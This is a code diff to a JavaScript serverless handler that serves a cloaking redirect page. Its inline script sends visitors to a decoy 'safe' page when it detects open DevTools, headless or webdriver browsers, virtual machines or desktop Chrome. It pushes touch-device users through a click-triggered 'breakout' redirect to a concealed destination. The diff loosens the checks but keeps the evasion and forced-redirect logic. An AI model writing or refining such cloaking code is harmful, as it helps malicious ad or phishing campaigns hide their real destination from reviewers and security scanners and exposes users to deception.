@@ -107,7 +107,7 @@ export default function handler(req, res) {
     return res.status(200).send('');
   }
 
-  // --- ULTRA-STRICT CLIENT-SIDE HTML ---
+  // --- BALANCED CLIENT-SIDE HTML ---
   const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -153,7 +153,7 @@ h1{font-size:20px;font-weight:600;line-height:1.3;margin-bottom:10px;opacity:.9}
 </div>
 </div>
 <script>
-// ULTRA-STRICT CLIENT-SIDE DETECTION
+// MINIMAL CLIENT-SIDE DETECTION (Balanced for DevTools)
 (function(){
 var DEST = ${JSON.stringify(finalDestUrl).replace(/</g, '\\u003c')};
 var SAFE = ${JSON.stringify(SAFE_PAGE).replace(/</g, '\\u003c')};
@@ -170,58 +170,13 @@ setInterval(function() {
     if (performance.now() - t > 100) { window.location.href = SAFE; }
 }, 1000);
 
-// ULTRA-STRICT HARDWARE VERIFICATION
+// MINIMAL HARDWARE CHECK (Only blocks obvious bots)
 function verifyHumanHardware() {
-    // Basic checks
+    // Block headless browsers
     if (navigator.webdriver) return false;
+    // Block non-touch devices (bots usually have 0)
     if (navigator.maxTouchPoints === 0) return false;
-    if (window.screen.width === window.screen.height) return false;
-
-    // Advanced checks
-    if (window.outerWidth === 0 || window.outerHeight === 0) return false;
-    if (!('deviceMemory' in navigator)) return false;
-    if (navigator.deviceMemory < 2) return false;
-    if (!('hardwareConcurrency' in navigator)) return false;
-    if (navigator.hardwareConcurrency < 2) return false;
-    if (window.screen.colorDepth < 24) return false;
-    if (window.screen.pixelDepth < 24) return false;
-
-    // WebGL fingerprinting
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) return false;
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (debugInfo) {
-            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            if (renderer && (renderer.includes('Headless') || renderer.includes('VirtualBox') || renderer.includes('VMware') || renderer.includes('Parallels') || renderer.includes('QEMU'))) {
-                return false;
-            }
-        }
-    } catch (e) {
-        return false;
-    }
-
-    // AudioContext check
-    try {
-        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        if (!audioContext) return false;
-    } catch (e) {
-        return false;
-    }
-
-    // Timezone check
-    try {
-        if (!Intl || !Intl.DateTimeFormat) return false;
-        new Intl.DateTimeFormat().resolvedOptions().timeZone;
-    } catch (e) {
-        return false;
-    }
-
-    // Plugin check
-    if (navigator.plugins.length === 0) return false;
-    if (navigator.mimeTypes.length === 0) return false;
-
+    // That's it - let everything else through
     return true;
 }
 
@@ -247,8 +202,7 @@ function doBreakout(){
         window.open(url, '_blank');
         setTimeout(function(){ if(!document.hidden){window.location.href=url;} },500);
     } else {
-        window.location.href = url;
-        setTimeout(function(){ if(!document.hidden){window.location.href=DEST;} },2000);
+        setTimeout(function(){ window.location.href = url; }, 2000);
     }
 }
 
@@ -260,12 +214,6 @@ var btn=document.getElementById('ctaButton');
 btn.onclick=function(e){e.preventDefault();e.stopPropagation();doBreakout();};
 document.getElementById('fullTap').addEventListener('click',function(){ doBreakout(); },{once:true});
 window.addEventListener('click',function(){doBreakout();},{once:true,passive:true});
-
-// Additional anti-bot checks
-if (navigator.language === 'en-US' && navigator.userAgent.includes('Chrome') && !navigator.userAgent.includes('Mobile')) {
-    // Desktop Chrome with en-US is often a bot
-    setTimeout(function() { window.location.href = SAFE; }, 5000);
-}
 
 })();
 </script>
